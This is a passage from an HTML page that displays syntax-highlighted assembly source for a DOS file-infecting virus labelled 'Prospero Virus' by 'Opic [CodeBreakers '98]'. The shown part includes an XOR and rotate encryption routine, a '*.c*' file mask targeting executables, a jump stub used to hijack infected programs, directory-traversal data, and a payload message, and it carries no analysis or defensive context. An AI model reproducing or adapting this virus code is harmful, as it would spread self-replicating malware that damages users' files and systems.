  </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">Noc</span><span class="sc0">
</span><span class="sc5">Value6</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">crypt6</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
 </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
 </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">value</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">crypt6</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">noc</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">;21 !!!</span><span class="sc0">
                                 
</span><span class="sc1">;-----------DATA--------------------------</span><span class="sc0">
</span><span class="sc5">newdta</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2ah</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">                         
</span><span class="sc5">filemask</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.c*'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  
</span><span class="sc5">three</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           
</span><span class="sc5">buff</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        
</span><span class="sc5">dot</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'..'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    
</span><span class="sc5">message1</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Prospero Virus"</span><span class="sc0">   </span><span class="sc1">;14</span><span class="sc0">
</span><span class="sc5">message2</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"(C) Opic [CodeBreakers '98]"</span><span class="sc0"> </span><span class="sc1">;27</span><span class="sc0">
</span><span class="sc5">counter</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">attribs</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc5">opbuf</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       
</span><span class="sc5">String1</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'************************PROSPERO!**************************'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'There is a path to the trancendece of the dollar: Embark'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">                                                   
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'rich beggars! Does magic bring prosperos to his knees?'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Reading pretty twilight, making grass uncertain?'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Oh,all that christmas snow shouldered by one birthday suit!'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'The fate of the world under his armpit like a thermometer?'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Rejoice Villains! Your time has come.'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">                                                       
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'**************(C) Opic [CodeBreakers,98]*******************'</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">
</span><span class="sc5">EndStr1</span><span class="sc4">:</span><span class="sc0">         

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Virus_End</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">prospero</span><span class="sc0"> </span><span class="sc9">Ends</span><span class="sc0">
</span><span class="sc9">End</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">
</span></div></body>
</html>
